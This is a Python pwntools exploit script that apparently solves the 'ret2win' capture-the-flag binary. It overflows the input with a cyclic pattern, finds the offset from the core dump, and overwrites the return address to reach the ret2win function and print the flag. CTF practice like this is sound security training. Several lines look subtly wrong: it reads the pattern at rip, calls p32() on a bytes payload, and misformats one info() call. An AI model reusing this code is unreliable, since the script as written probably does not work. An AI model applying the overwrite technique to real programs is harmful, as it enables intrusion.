#!/usr/bin/python
from pwn import *

# setup pwntools
elf = context.binary = ELF('ret2win')

# get base address
info("%#x <-- base address" % elf.address)

# run process and inject random chars
io = process(elf.path)
io.sendline(cyclic(50))
io.wait()

# analyze corefile/dump
core = io.corefile
stack = core.rip
info("%#x stack", stack)

# find the pattern where the crash happened
pattern = core.read(stack,4)
info("%r pattern", pattern)


# build the payload with the address for ret2win
payload = fit({
	pattern: elf.symbols.ret2win
})
print p32(payload)

# Send the payload to a new copy of the process
io = process(elf.path)
io.sendline(payload)
io.recvuntil("Here's your flag:")

# Get our flag!
flag = io.recvline()
success(flag)
